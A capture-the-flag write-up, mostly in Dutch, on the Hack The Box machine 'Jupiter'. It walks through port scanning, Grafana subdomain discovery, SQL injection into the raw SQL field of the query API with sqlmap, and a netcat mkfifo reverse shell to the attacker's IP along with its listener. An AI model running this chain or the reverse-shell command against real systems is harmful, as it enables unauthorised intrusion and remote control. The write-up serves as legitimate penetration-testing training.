# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Jupiter]
└─$ nmap 10.129.229.15 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:26 CEST
Nmap scan report for 10.129.229.15
Host is up (0.090s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
### Detailed port scan

At the detailed port scan go to get more information from the services which are open on the ip address.

```
┌──(kali㉿kali)-[~/HTB/Jupiter]
└─$ nmap -p22,80 -sCV 10.129.229.15        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:26 CEST
Nmap scan report for 10.129.229.15
Host is up (0.089s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
|_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ik ben de FQDN in de hosts file gaan zetten zodat ik naar de url kan gaan. Als je gaat kijken naar de URL dan kan je zien dat je daar helemaal niets kunt doen. Daarmee ben ik gaan kijken of dat er geen subdomain is. Dit kan je gaan kijken door gebruik te maken van FFUF.

```
┌──(kali㉿kali)-[~/HTB/Jupiter]
└─$ ffuf -u http://jupiter.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host:FUZZ.jupiter.htb" -ac

kiosk                   [Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 174ms]
```

Als je dit subdomain zult gaan toevoegen aan de hosts file, dan kan je zien dat als je de volgende url `kiosk.jupiter.htb` kan je zien dat je op een grafana pagina komt.

![[Pasted image 20250725135051.png]]

Als we in burpsuite gaan kijken kan je zien dat er een api query tab is. Dit wilt dus zeggen dat we eens gaan kijken of dat er geen interessante informatie in staat zoals een DB tabel, ... . Zoals je hieronder kunt zien is de user `postgres` de database aan het runnen.

![[Pasted image 20250725161438.png]]

Je kan zien dat postgres de user is dat de database runned. Hieraan kan je zien dat je waarschijnlijk aan sql injection zult moeten doen. Ik ben dan naar artikels gaan opzoeken op pentesting postgressql en hierbij ben ik op het volgende artikel gekomen. https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html

Voor dat je aan de sqlinjection begint zal je de informatie vanuit de `http://kiosk.jupiter.htb/api/ds/query` die je hebt gevonden door devtool te gebruiken in een file gaan zetten. Dit zal er als volgt uit komen te zien.

```
┌──(kali㉿kali)-[~/HTB/Jupiter]
└─$ cat test                 
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
Content-Length: 484
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
Accept-Language: en-US,en;q=0.9
x-panel-id: 24
x-plugin-id: postgres
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
accept: application/json, text/plain, */*
content-type: application/json
x-grafana-org-id: 1
Origin: http://kiosk.jupiter.htb
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":460}],"range":{"from":"2025-07-30T11:04:00.474Z","to":"2025-07-30T17:04:00.474Z","raw":{"from":"now-6h","to":"now"}},"from":"1753873440474","to":"1753895040474"}
```

Vanaf nu kan je sqlmap gaan gebruiken voor het injecte van de sql query. We zullen eerst gaan zien of een sqlinjection wel zal lukken door het volgende commando te gebruiken: 

```
┌──(kali㉿kali)-[~/HTB/Jupiter]
└─$ sqlmap -r test --fresh-queries --batch --dbms postgresql
 
 > 8.1 stacked queries (comment)' injectable 
 requests:
---
Parameter: JSON rawSql ((custom) POST)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: {"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;;SELECT PG_SLEEP(5)--","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":460}],"range":{"from":"2025-07-30T11:04:00.474Z","to":"2025-07-30T17:04:00.474Z","raw":{"from":"now-6h","to":"now"}},"from":"1753873440474","to":"1753895040474"}
---

[*] ending @ 20:15:16 /2025-07-30/
```

Hierboven kan je zien dat de stacked queries injectable zijn. Door het help commando te gaan gebruiken van sqlmap ben ik de volgende code gaan

```
┌──(kali㉿kali)-[~/HTB/Jupiter]
└─$ sqlmap -r test --fresh-queries --batch --dbms postgresql --time-sec=1 --current-user --current-db --hostname --is-dba --privileges --dbs --tables
 
[*] starting @ 20:25:33 /2025-07-30/

[20:25:33] [INFO] parsing HTTP request from 'test'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[20:25:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON rawSql ((custom) POST)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: {"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;;SELECT PG_SLEEP(1)--","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":460}],"range":{"from":"2025-07-30T11:04:00.474Z","to":"2025-07-30T17:04:00.474Z","raw":{"from":"now-6h","to":"now"}},"from":"1753873440474","to":"1753895040474"}
---
[20:25:34] [INFO] testing PostgreSQL
[20:25:39] [INFO] confirming PostgreSQL
[20:25:39] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[20:25:40] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: PostgreSQL
[20:25:40] [INFO] fetching current user
[20:25:40] [INFO] retrieved: grafana_viewer
current user: 'grafana_viewer'
[20:26:38] [INFO] fetching current database
[20:26:38] [INFO] retrieved: pu
[20:26:53] [ERROR] invalid character detected. retrying..
blic
[20:27:06] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
current database (equivalent to schema on PostgreSQL): 'public'
[20:27:06] [WARNING] on PostgreSQL it is not possible to enumerate the hostname
[20:27:06] [INFO] testing if current user is DBA
current user is DBA: True
[20:27:07] [INFO] fetching database users privileges
[20:27:07] [INFO] fetching database users
[20:27:07] [INFO] fetching number of database users
[20:27:07] [INFO] retrieved: 2
[20:27:10] [WARNING] reflective value(s) found and filtering out of statistical model, please wait                
.............................. (done)

[20:27:14] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[20:27:14] [INFO] retrieved: 
[20:27:14] [ERROR] unable to retrieve the database users
[20:27:14] [CRITICAL] unable to retrieve the privileges for the database users
[20:27:14] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
[20:27:14] [INFO] fetching database (schema) names
[20:27:14] [INFO] fetching number of databases
[20:27:14] [INFO] retrieved: 3
[20:27:19] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)

[20:27:23] [INFO] retrieved: 
[20:27:24] [INFO] retrieved: 
[20:27:24] [INFO] falling back to current database
[20:27:24] [INFO] fetching current database
available databases [1]:
[*] public

[20:27:24] [INFO] fetching tables for database: 'public'
[20:27:24] [INFO] fetching number of tables for database 'public'
[20:27:24] [INFO] retrieved: 1
[20:27:26] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
moons
Database: public
[1 table]
+-------+
| moons |
+-------+

[20:27:52] [WARNING] HTTP error codes detected during run:
400 (Bad Request) - 75 times
[20:27:52] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/kiosk.jupiter.htb'

[*] ending @ 20:27:52 /2025-07-30/
```


RCE connection met de server

```
┌──(kali㉿kali)-[~/HTB/Jupiter]
└─$ sqlmap -r test --fresh-queries --batch --dbms postgresql --os-shell      

os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.82 8001 >/tmp/f &
do you want to retrieve the command standard output? [Y/n/a] Y
[20:45:12] [INFO] retrieved: 
No output
os-shell> 
```

Listener

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8001
listening on [any] 8001 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.229.15] 54226
sh: 0: can't access tty; job control turned off
$ ls
```